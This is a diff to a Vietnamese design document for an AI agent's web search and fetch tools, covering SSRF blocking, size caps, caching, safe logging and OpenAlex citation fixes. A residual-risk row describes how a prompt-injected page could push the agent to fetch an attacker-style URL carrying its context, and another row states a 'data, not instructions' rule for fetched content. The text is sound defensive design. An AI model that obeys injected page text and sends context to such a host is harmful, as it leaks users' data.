@@ -59,7 +59,7 @@ Kết luận: **không có máy tìm kiếm web tổng quát nào miễn phí v�
 | Vai được dùng | `research` (chính) và `orchestrator`; con của ai chỉ có giao của cha | đúng mong đợi "giao cho agent research"; `allowed_tools` đã giao theo cha |
 | Chặn SSRF | chỉ `http`/`https`; từ chối tên `localhost`/`*.internal`/metadata; phân giải DNS **và** kiểm cả địa chỉ literal; kiểm lại từng bước chuyển hướng | mặt quản trị của router/harness/box nằm trên loopback — không được để công cụ này chạm tới |
 | Trần dữ liệu | thân 2 MiB, 15 s, tối đa 10 kết quả, đoạn trích 400 ký tự, văn bản 8 000 (trần cứng 20 000), **một lời gọi tìm kiếm ≤ 3 truy vấn**, **không có phân trang**, **các hàng của một lời gọi tìm kiếm ≤ 18 000 ký tự** | giữ ngữ cảnh và không để một trang lạ nuốt ngân sách. Truy vấn gộp (A-7) là cách duy nhất để có thêm đất: `count` là trần **mỗi chân**, `queries` là số chân trong **một** lời gọi (D-13/F7: các chân chạy tuần tự, không song song) |
-| Bộ đệm tìm kiếm | **300 s** × 16 mục khoá theo hình dạng lời gọi (truy vấn, `source`, `count`, `site`, `freshness`, `lang`, `exclude`) | một mô hình hỏi lại cùng câu trong cùng lượt không tốn một chuyến mạng thứ hai; đo được 0,0009 s so với 0,42 s (A-7) |
+| Bộ đệm tìm kiếm | **300 s** × 16 mục khoá theo hình dạng lời gọi (truy vấn, `source`, `count`, `site`, `freshness`, `lang`, `exclude`) | một mô hình hỏi lại cùng câu **với đúng bộ tham số ấy** trong cùng lượt không tốn một chuyến mạng thứ hai; đo được 0,0009 s so với 0,42 s (A-7) |
 | Nhãn tin cậy | mọi payload có `untrusted: true` và câu nhắc "dữ liệu, không phải chỉ thị" | nội dung tải về là dữ liệu của bên thứ ba |
 | Nhật ký DEV | `web.search`, `web.fetch`, `web.error`, `web.retry` (chỉ số đếm, mã lỗi, thời gian — **không** nội dung truy vấn; `web.retry` mang đúng `attempt` + `code`) | điều tra được mà không rò dữ liệu; ranh giới này áp cho **mọi** đường ghi nhật ký, kể cả dòng `tool.error` chung (`WebError.log_message` + `failures.log_safe_failure`) — vòng soát mã đợt 10 bắt được nhánh lỗi còn ghi nguyên câu có truy vấn và URL |
 | Rủi ro còn lại: kênh ra | `web_fetch` là kênh GET ra ngoài, giữ bởi cả `orchestrator` và `research` — một trang bị tiêm nhiễm có thể xúi agent tải `https://ke-tan-cong/?<ngữ cảnh>` | đây là chiều RÒ RA, khác với chiều nội dung bẩn vào; nhãn untrusted không chặn được nó. Giảm nhẹ đang có: chỉ `http(s)`, trần 2 MiB, danh sách đích công khai; muốn chặt hơn thì bỏ `web_*` khỏi `ORCHESTRATOR_TOOLS`, hoặc thêm danh sách đích cho phép |
@@ -222,10 +222,22 @@ theo đồ thị trích dẫn của **một** bài, keyless:
   Danh sách dài hơn 50 ⇒ `total` nói **đủ** số thật, `count` nói số đã lấy — không im lặng.
 
 ĐO ĐƯỢC 2026-09-23: `W2741809807` có **54** tham chiếu; `filter=cites:W2741809807&per-page=2` trả
-`count=1255` trong **891 byte**; work đầy đủ 33 226 byte ⇒ `select` còn **2 967 byte**. `mailto` của
+`count=1255` trong **891 byte** (đúng bộ `select` mà `_openalex_json` gửi: `filter=cites:…&select=…&per-page=2`);
+work đầy đủ 33 226 byte ⇒ cùng bộ `select` ấy còn **2 967 byte**. Con số byte phụ thuộc bộ `select` —
+hôm sau đo lại cùng URL với `per-page=2` là 4 895 byte, nên hãy đọc đây là "nhỏ hơn một bậc", không
+phải một hằng số. `mailto` của
 dự án (`BOXFOX_OPENALEX_MAILTO`, mặc định trung tính) là thứ làm 429 biến mất ở Crossref, và
 `_retry` (429/5xx/hết giờ, tôn trọng `Retry-After` ≤ 5 s, **không** thử lại 4xx khác) là thứ giữ
 được nguồn khi nhà cung cấp chớp: đo được Crossref 429→200 và Europe PMC 200→503 trong cùng phiên.
+
+**Sửa một lỗi THẬT thứ hai mà lượt kiểm độc lập bắt được (2026-09-23):** `paper_citations` với `doi`
++ `direction="forward"` từng ném `WEB_FETCH_FAILED … answered HTTP 400`: nhánh `forward` nhét thẳng
+`filter=cites:doi:…`, mà `filter` của OpenAlex chỉ nhận mã `W…` (OpenAlex trả đúng câu
+`'doi:10.7717/peerj.4375' is not a valid OpenAlex ID.`). Nhánh `backward` không dính vì DOI đi trong
+**đường dẫn** (`works/doi:…` — đo được 200, trả `W2741809807`). Nay DOI (dạng thô, `doi:…`, hay
+`https://doi.org/…`) được **giải** thành `W…` bằng một lời gọi thêm `works/doi:…?select=id` (42 byte)
+trước khi lọc; `work` trong payload trả mã `W…` đã giải, và nếu không giải được thì ném
+`WEB_SEARCH_UNAVAILABLE` chứ không nhét `doi:…` vào `filter` lần nữa. `backward` giữ nguyên đường dẫn cũ.
 
 **Sửa một lỗi THẬT mà ca đơn vị bắt được ngay khi viết (2026-09-23):** `PAPER_CITATIONS_RESOLVE_MAX`
 được **dùng** ở nhánh `backward` nhưng **thiếu trong danh sách import** ⇒ mọi lời gọi `backward` có
@@ -244,7 +256,7 @@ thẳng** điều đó để mô hình không thử `page=2`.
   `query` đứng đầu) và **nói ra** bằng `dropped`. Không có ngân sách này thì model nhận một chuỗi JSON
   hỏng thay vì "ít kết quả hơn" — và lượt ấy lại đúng là lượt đi tìm dữ liệu.
 - **Gộp + khử trùng:** mọi kết quả của mọi chân đi qua một lần khử trùng theo URL **đã chuẩn hoá**
-  (bỏ fragment, bỏ `utm_*`/`fbclid`/`gclid`, bỏ `www.`, sắp lại query) và theo **gần trùng** (Jaccard
+  (bỏ fragment, bỏ `utm_*`/`fbclid`/`gclid`, bỏ `www.`, mã hoá lại query **giữ nguyên thứ tự** —
   ≥ 0,8 **và** mỗi bên ≥ 8 token — ngưỡng token là thứ giữ cho các kết quả ngắn cùng khuôn không bị
   gộp oan; đó là một ca đỏ thật trong lúc viết ca). Bản giữ lại là bản **đầu**, các bản sau vào
   `alsoFrom` ⇒ không mất dấu vết.
@@ -254,6 +266,11 @@ thẳng** điều đó để mô hình không thử `page=2`.
 - **`exclude` không bật mặc định** (#5991): lọc **kết quả** phía ta, không cắt truy vấn, và chỉ khi
   người gọi yêu cầu.
 - **Cache 300 s / 16 mục** theo hình dạng lời gọi; lời gọi lặp trả `cached: true` + `fetchedAt` gốc.
+  Cùng một câu hỏi nhưng **khác** bộ tham số (ví dụ câu ấy chuyển từ `query` sang `queries`) là khoá
+  khác ⇒ tốn chuyến mạng mới (đo được: 2 chuyến), nên chỗ này chỉ miễn phí khi **hình dạng y hệt**.
+- **Giới hạn còn lại, nói thẳng:** ngân sách giữ hàng **đầu** vô điều kiện (hàng của chân chính), nên
+  một URL khổng lồ (đo được một hàng 31 298 ký tự trong lượt kiểm độc lập) vẫn có thể đẩy payload qua
+  trần runtime. Trần cho MỘT hàng ấy chưa có luật riêng; xử lý đúng sẽ là một việc của đợt sau.
 - **Thử lại:** chân bị 429/5xx được thử lại **một** lần, ghi `web.retry` (`attempt` + `code`, không
   truy vấn/URL); `Retry-After` được tôn trọng tới trần 5 s.
 - **Chân lỗi không im lặng:** `perQuery` nói từng truy vấn lấy được bao nhiêu, và truy vấn nào bị từ
